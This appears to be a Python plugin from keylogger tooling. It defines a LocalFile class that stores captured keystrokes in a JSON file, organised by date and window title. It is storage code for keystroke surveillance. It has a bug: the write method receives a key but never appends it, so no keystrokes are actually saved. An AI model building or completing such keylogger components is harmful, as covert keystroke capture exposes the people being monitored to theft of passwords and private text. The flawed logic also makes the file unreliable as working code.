import json
from datetime import date

from plugins.plugin_base import PluginBase


class LocalFile(PluginBase):
    """
    Writes all key strokes to local file specified

    buffer structure - {date: {windows name: [list of keystrokes]}}
    """

    def __init__(self, path="logs.json"):
        self.path = path
        try:
            self.buffer = json.load(open(path, "r"))
        except (FileNotFoundError, json.decoder.JSONDecodeError):
            self.buffer = dict()

    def write(self, date_time, window, key):
        if str(date.today()) not in self.buffer:  # check if current date in dict
            self.buffer[str(date.today())] = dict()
        if window not in self.buffer[str(date.today())]:  # check if window already in dict
            self.buffer[str(date.today())][window] = list()

        json.dump(self.buffer, open(self.path, "w"))
